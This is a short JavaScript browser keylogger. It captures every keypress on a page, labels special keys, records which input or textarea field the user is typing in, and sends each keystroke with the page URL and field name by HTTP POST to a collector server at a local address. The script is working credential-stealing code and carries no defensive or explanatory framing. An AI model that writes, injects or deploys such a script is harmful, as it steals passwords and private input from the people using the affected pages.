inputarea = ''
var http = new XMLHttpRequest();

document.onkeypress = function KeyPress(e){
	var key;
	var u;
	e = e.which || e.keyCode;
	if(e) {             
		key = e
	}
	u = key;
 	switch (key) {
		case 32:
			u = "[Space]";
			break;
		case 13:
			u = "[Enter]";
			break;
		case 9:
			u = "[Tab]";
			break;
		case 8:
			u = "[Backspace]";
	}
	if (u === parseInt(key, 10)){
		u = String.fromCharCode(key)
		ky = u;
	}
	else {
		ky = u;
	}

	function spyOn() {
        	var inputFields = document.querySelectorAll('input,textarea'),
            	emitChange = function () {
                  	 inputarea = this.name;
			  
            	};

       		for (var i = 0; i < inputFields.length; i++) {
        	    var field = inputFields[i];
        	    field.onkeydown = emitChange;
			};
		
		}

	var on = spyOn();
	http.open("POST","http://127.0.0.1:8080/",true);
	http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	http.send("key:::"+ky+':::'+document.URL+':::#'+inputarea);
	
}

